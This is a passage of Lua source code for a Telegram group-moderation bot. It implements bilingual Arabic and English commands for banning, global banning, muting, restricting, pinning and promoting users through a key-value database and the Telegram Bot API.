            function unban_by_reply(extra, result, success)
              local hash = 'bot:banned:'..msg.chat_id_
              if not database:sismember(hash, result.sender_user_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not banned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| لم يتم حظره في البوت سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                end
              else
                database:srem(hash, result.sender_user_id_)
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been unbanned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المحظور ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم الغاء حظره بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                end
              end
            end
            getMessage(msg.chat_id_, msg.reply_to_message_id_,unban_by_reply)
          end
          ---------------------------------faeder--------------------------------------------------------------
          if text:match("^[Uu]nban @(.*)$") then
            local ap = {string.match(text, "^([Uu]nban) @(.*)$")}
            function unban_by_username(extra, result, success)
              if result.id_ then
                if not database:sismember('bot:banned:'..msg.chat_id_, result.id_) then
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.id_..' ، 🚦\n🎈|| is not banned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| لم يتم حظره في البوت سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                  end
                else
                  database:srem('bot:banned:'..msg.chat_id_, result.id_)
                  if database:get('lang:gp:'..msg.chat_id_) then
                    text = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| has been unbanned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
                  else
                    text = '🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| تم الغاء حظره من المجموعه بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ'
                  end
                end
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  text = '*🎈|| Username is not correct ❎*'
                else
                  text = '*🎈|| المعرف غير صحيح ❎*'
                end
              end
              faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
            end
            resolve_username(ap[2],unban_by_username)
          end
          --------------------------------faeder---------------------------------------------------------------
          if text:match("^[Uu]nban (%d+)$") then
            local ap = {string.match(text, "^([Uu]nban) (%d+)$")}
            if not database:sismember('bot:banned:'..msg.chat_id_, ap[2]) then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been unbanned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المحظور ؛ '..ap[2]..' ، 🚷\n🎈|| تم الغاء حظره بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            else
              database:srem('bot:banned:'..msg.chat_id_, ap[2])
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been unbanned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المحظور ؛ '..ap[2]..' ، 🚷\n🎈|| تم الغاء حظره بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            end
          end
          -------------------------------------faeder--------------------------------------------------------
          local text = msg.content_.text_:gsub('حظر عام','Banall')
          if text:match("^[Bb]anall$") and is_sudo(msg) and msg.reply_to_message_id_ then
            function gban_by_reply(extra, result, success)
              local hash = 'bot:gban:'
              database:sadd(hash, result.sender_user_id_)
              chat_kick(result.chat_id_, result.sender_user_id_)
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been globaly banned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| الحضينه ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم حظره عام ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            end
            getMessage(msg.chat_id_, msg.reply_to_message_id_,gban_by_reply)
          end
          ----------------------------------------faeder-------------------------------------------------------
          if text:match("^[Bb]anall @(.*)$") and is_sudo(msg) then
            local aps = {string.match(text, "^([Bb]anall) @(.*)$")}
            function gban_by_username(extra, result, success)
              local hash = 'bot:gban:'
              if result.id_ then
                if database:get('lang:gp:'..msg.chat_id_) then
                  text = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| has been globaly banned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
                else
                  text = '🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| تم حظره عام ✅ \nֆ • • • • • • • • • • • • • • • • ֆ'
                end
                database:sadd(hash, result.id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  text = '*🎈|| Username is not correct ❎*'
                else
                  text = '*🎈|| المعرف غير صحيح ❎*'
                end
              end
              faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
            end
            resolve_username(aps[2],gban_by_username)
          end
          ----------------------------------faeder-------------------------------------------------------------
          if text:match("^[Bb]anall (%d+)$") and is_sudo(msg) then
            local ap = {string.match(text, "^([Bb]anall) (%d+)$")}
            local hash = 'bot:gban:'
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been globaly banned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| الحضينه ؛ '..ap[2]..' ، 🚷\n🚦|| تم حظره عام ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
            end
            database:set('bot:gban:'..ap[2],true)
            database:sadd(hash, ap[2])
          end
          ---------------------------------------faeder--------------------------------------------------------
          local text = msg.content_.text_:gsub('الغاء العام','unbanall')
          if text:match("^[Uu]nbanall$") and is_sudo(msg) and msg.reply_to_message_id_ then
            function ungban_by_reply(extra, result, success)
              local hash = 'bot:gban:'
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been unbanned (Gban) ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم الغاء حظره عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
              database:srem(hash, result.sender_user_id_)
            end
            getMessage(msg.chat_id_, msg.reply_to_message_id_,ungban_by_reply)
          end
          ------------------------------------------faeder-----------------------------------------------------
          if text:match("^[Uu]nbanall @(.*)$") and is_sudo(msg) then
            local apid = {string.match(text, "^([Uu]nbanall) @(.*)$")}
            function ungban_by_username(extra, result, success)
              local hash = 'bot:gban:'
              if result.id_ then
                if database:get('lang:gp:'..msg.chat_id_) then
                  text = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| has been unbanned (Gban) ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
                else
                  text = '🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| تم الغاء حظره عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ'
                end
                database:srem(hash, result.id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  text = '*🎈|| Username is not correct ❎*'
                else
                  text = '*🎈|| المعرف غير صحيح ❎*'
                end
              end
              faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
            end
            resolve_username(apid[2],ungban_by_username)
          end
          ---------------------------------faeder--------------------------------------------------------------
          if text:match("^[Uu]nbanall (%d+)$") and is_sudo(msg) then
            local ap = {string.match(text, "^([Uu]nbanall) (%d+)$")}
            local hash = 'bot:gban:'
              database:srem(hash, ap[2])
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🎈\n🚦|| has been unbanned (Gban) ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..ap[2]..' ، 🚷\n🎈|| تم الغاء حظره عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            end
          -----------------------------------------faeder------------------------------------------------------
          local text = msg.content_.text_:gsub('كتم','Muteuser') and not database:get('lock:mute:free'..bot_id)
          local text = msg.content_.text_:gsub('كتم','Muteuser')
        if text:match("^[Mm]uteuser$") and msg.reply_to_message_id_ ~= 0 then
           function mute_by_reply(extra, result, success)
          if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
               faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لا تستطيع كتمي •', 1, 'md')
          return false 
            end 
         if is_momod(result.sender_user_id_, msg.chat_id_) then
               faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لا تستطيع كتم تاج راسك •', 1, 'md')
            else 
         database:sadd('bot:muted:'..msg.chat_id_, result.sender_user_id_)
             faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم كتمه من المجموعه بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md') 
            end
            end
         getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
            end
          ----------------------------------------faedrr-------------------------------------------------------
          if text:match("^[Mm]uteuser @(.*)$") then
            local ap = {string.match(text, "^([Mm]uteuser) @(.*)$")}
            function mute_by_username(extra, result, success)
              if result.id_ then
                database:sadd('bot:muted:'..msg.chat_id_, result.id_)
                if database:get('lang:gp:'..msg.chat_id_) then
                  texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🚦|| has been muted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
                else
                  texts = '🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| تم كتمه في البوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ'
                end
                chat_kick(msg.chat_id_, result.id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  texts = '*🎈|| Username is not correct ❎*'
                else
                  texts = '*🎈|| المعرف غير صحيح ❎*'
                end
              end
              faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
            end
            resolve_username(ap[2],mute_by_username)
          end
          ---------------------------------faeder--------------------------------------------------------------
          if text:match("^[Mm]uteuser (%d+)$") then
            local ap = {string.match(text, "^([Mm]uteuser) (%d+)$")}
            if database:sismember('bot:muted:'..msg.chat_id_, ap[2]) then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| is already muted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..ap[2]..' ، 🚷\n🎈|| تم كتمه من المجموعه سابقا ✅\nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            else
              database:sadd('bot:muted:'..msg.chat_id_, ap[2])
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been muted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..ap[2]..' ، 🚷\n🎈|| تم كتمه من المجموعه بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            end
          end
          ------------------------------------faeder-----------------------------------------------------------
          local text = msg.content_.text_:gsub('الغاء كتم','Unmuteuser')
          if text:match("^[Uu]nmuteuser$") and msg.reply_to_message_id_ ~= 0 then
            function unmute_by_reply(extra, result, success)
              local hash = 'bot:muted:'..msg.chat_id_
              if not database:sismember(hash, result.sender_user_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| not muted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| لم يتم كتمه سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                end
              else
                database:srem(hash, result.sender_user_id_)
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been unmuted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المكتوم ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم الغاء كتمه من البوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                end
              end
            end
            getMessage(msg.chat_id_, msg.reply_to_message_id_,unmute_by_reply)
          end
          ------------------------------------faeder-----------------------------------------------------------
          if text:match("^[Uu]nmuteuser @(.*)$") then
            local ap = {string.match(text, "^([Uu]nmuteuser) @(.*)$")}
            function unmute_by_username(extra, result, success)
              if result.id_ then
                if not database:sismember('bot:muted:'..msg.chat_id_, result.id_) then
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| not muted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| لم يتم كتمه سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                  end
                else
                  database:srem('bot:muted:'..msg.chat_id_, result.id_)
                  if database:get('lang:gp:'..msg.chat_id_) then
                    text = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| has been unmuted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
                  else
                    text = '*🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| تم الغاء كتمه في البوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
                  end
                end
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  text = '*🎈|| Username is not correct ❎*'
                else
                  text = '*🎈|| المعرف غير صحيح ❎*'
                end
              end
              faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
            end
            resolve_username(ap[2],unmute_by_username)
          end
          ---------------------------------faeder--------------------------------------------------------------
          if text:match("^[Uu]nmuteuser (%d+)$") then
            local ap = {string.match(text, "^([Uu]nmuteuser) (%d+)$")}
            if not database:sismember('bot:muted:'..msg.chat_id_, ap[2]) then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| not muted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..ap[2]..' ، 🚷\n🎈|| لم يتم كتمه سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            else
              database:srem('bot:muted:'..msg.chat_id_, ap[2])
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been unmuted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المكتوم ؛ '..ap[2]..' ، 🚷\n🎈|| تم الغاء كتمه من البوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            end
          end
        end
        -----------------------faeder
if text:match("^تقييد$") and msg.reply_to_message_id_ ~= 0 then
function mute_by_reply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
 faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لا تستطيع تقييدي •', 1, 'md')
return false 
end 
if is_momod(result.sender_user_id_, msg.chat_id_) then
 faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لا تستطيع تقييد تاج راسك •', 1, 'md')
else 
HTTPS.request("https://api.telegram.org/bot"..tokenbot.."/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.."")
database:sadd('tkeed:'..msg.chat_id_, result.sender_user_id_)
faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم تقييده من المجموعه بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md') 
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
----------faeder
if text:match("^الغاء التقييد$") and msg.reply_to_message_id_ ~= 0 then
function mute_by_reply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
faederdx(msg.chat_id_, msg.id_, 1, 'هاذا البوت', 1, 'md')  
return false 
end 
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
database:srem('tkeed:'..msg.chat_id_, result.sender_user_id_)
faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم الغاء تقييده ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md') 
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
     if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^المقيدين$") then
            local hash =  'tkeed:'..msg.chat_id_
            local list = database:smembers(hash)
            if database:get('lang:gp:'..msg.chat_id_) then
              text = "🚦⁞ List of baneed • \n\n"
            else
              text = "🚦⁞ قائمه المقيدين 🔽 \n\n"
            end
            for k,v in pairs(list) do
              local user_info = database:hgetall('user:'..v)
              if user_info and user_info.username then
                local username = user_info.username
                text = text..k.." ~  ⁞ @"..username.." ["..v.."]\n"
              else
                text = text..k.." ~  ⁞ "..v.."\n"
              end
            end
            if #list == 0 then
              if database:get('lang:gp:'..msg.chat_id_) then
                text = "🚦⁞ List of baeed is empty •"
              else
               text = "🚦⁞ لا يوجد المقيدين •"
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
          end
          end
if text == 'مسح المقيدين' then     
local hash =  'tkeed:'..msg.chat_id_
local list = database:smembers(hash)
for k,v in pairs(list) do   
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..v.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
database:srem('tkeed:'..msg.chat_id_, v)
end 
faederdx(msg.chat_id_, msg.id_, 1,'🚦⁞ تم مسح المقيدين •', 1, 'md')
 end

        -------------------------------------------faeder----------------------------------------------------
        if text==("تثبيت") and msg.reply_to_message_id_ ~= 0 then  
        local id = msg.id_
        local msgs = {[0] = id}
       pin(msg.chat_id_,msg.reply_to_message_id_,1)
	   database:set('pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
	faederdx(msg.chat_id_, msg.id_, 1,'🚦⁞ تم تثبيت الرساله •', 1, 'md')
   end
local text = msg.content_.text_:gsub('رفع منشئ','Setmonsh')
        if text:match("^[Ss]etmonsh$") and is_admin(msg.sender_user_id_) and msg.reply_to_message_id_ ~= 0 then
          function setmonsh_by_reply(extra, result, success)
            local hash = 'bot:monsh:'..msg.chat_id_
            if database:sismember(hash, result.sender_user_id_) then
              if database:get('lang:gp:'..msg.chat_id_) then
               faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now monsh ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه منشئ سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            else
              database:sadd(hash, result.sender_user_id_)
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been monsh ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه منشئ بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            end
          end
          getMessage(msg.chat_id_, msg.reply_to_message_id_,setmonsh_by_reply)
        end
        --------------------------------------------faedee---------------------------------------------------
        if text:match("^[Ss]etmonsh @(.*)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
          local ap = {string.match(text, "^([Ss]etmonsh) @(.*)$")}
          function setmonsh_by_username(extra, result, success)
            if result.id_ then
              database:sadd('bot:monsh:'..msg.chat_id_, result.id_)
              if database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| added to monsh list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
              else
                texts = '*🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| تم رفعه منشئ بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
              end
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| Username is not correct ❎*'
              else
                texts = '*🎈|| المعرف غير صحيح ❎*'
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
          end
          resolve_username(ap[2],setmonsh_by_username)
        end
        --------------------------------------faeder---------------------------------------------------------
        if text:match("^[Ss]etmonsh (%d+)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
          local ap = {string.match(text, "^([Ss]etmonsh) (%d+)$")}
          database:sadd('bot:monsh:'..msg.chat_id_, ap[2])
          if database:get('lang:gp:'..msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been monsh ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..ap[2]..' ، 🚷\n🎈|| تم رفعه منشئ بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
          end
        end
        ----------------------------------------faeder-------------------------------------------------------
        local text = msg.content_.text_:gsub('تنزيل منشئ','Demmonsh')
        if text:match("^[Dd]emmonsh$") and is_admin(msg.sender_user_id_) and msg.reply_to_message_id_ ~= 0 then
          function demonsh_by_reply(extra, result, success)
            local hash = 'bot:monsh:'..msg.chat_id_
            if not database:sismember(hash, result.sender_user_id_) then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not a monsh ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| لم يتم رفعه منشئ سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            else
              database:srem(hash, result.sender_user_id_)
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The monsh ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| removed from monsh list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المنشئ ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            end
          end
          getMessage(msg.chat_id_, msg.reply_to_message_id_,demonsh_by_reply)
        end
        ----------------------------------------faeder-------------------------------------------------------
        if text:match("^[Dd]emmonsh @(.*)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
          local hash = 'bot:monsh:'..msg.chat_id_
          local ap = {string.match(text, "^([Dd]emmonsh) @(.*)$")}
          function remmonsh_by_username(extra, result, success)
            if result.id_ then
              database:srem(hash, result.id_)
              if database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| The Owner ؛ '..result.id_..' ، 🚷\n🎈|| removed from monsh list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
              else
                texts = '*🎈|| المنشئ ؛ '..result.id_..' ، 🚷\n🎈|| تم تنزيله عضو في البوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
              end
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| Username is not correct ❎*'
              else
                texts = '*🎈|| المعرف غير صحيح ❎*'
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
          end
          resolve_username(ap[2],remmonsh_by_username)
        end
        ----------------------------------------------faeder-------------------------------------------------
        if text:match("^[Dd]emmonsh (%d+)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
          local hash = 'bot:monsh:'..msg.chat_id_
          local ap = {string.match(text, "^([Dd]emmonsh) (%d+)$")}
          database:srem(hash, ap[2])
          if database:get('lang:gp:'..msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The monsh ؛ '..ap[2]..' ، 🚷\n🎈|| removed from monsh list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المنشئ ؛ '..ap[2]..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
          end
        end
        -------------------------------faeder-------------------
        local text = msg.content_.text_:gsub('رفع مدير عام','Setownerall')
        if text:match("^[Ss]etownerall$") and is_admin(msg.sender_user_id_) and msg.reply_to_message_id_ ~= 0 then
          function setownerall_by_reply(extra, result, success)
            local hash = 'bot:onall:'
            if database:sismember(hash, result.sender_user_id_) then
              if database:get('lang:gp:'..msg.chat_id_) then
               faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now onwer all✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه مدير عام سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            else
              database:sadd(hash, result.sender_user_id_)
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been onwer all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه مدير عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            end
          end
          getMessage(msg.chat_id_, msg.reply_to_message_id_,setownerall_by_reply)
        end
        --------------------------------------------faedee---------------------------------------------------
        if text:match("^[Ss]etownerall @(.*)$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
          local ap = {string.match(text, "^([Ss]etownerall) @(.*)$")}
          function setownerall_by_username(extra, result, success)
            if result.id_ then
              database:sadd('bot:onall:', result.id_)
              if database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| added to owner all list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
              else
                texts = '*🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| تم رفعه مدير عام بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
              end
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| Username is not correct ❎*'
              else
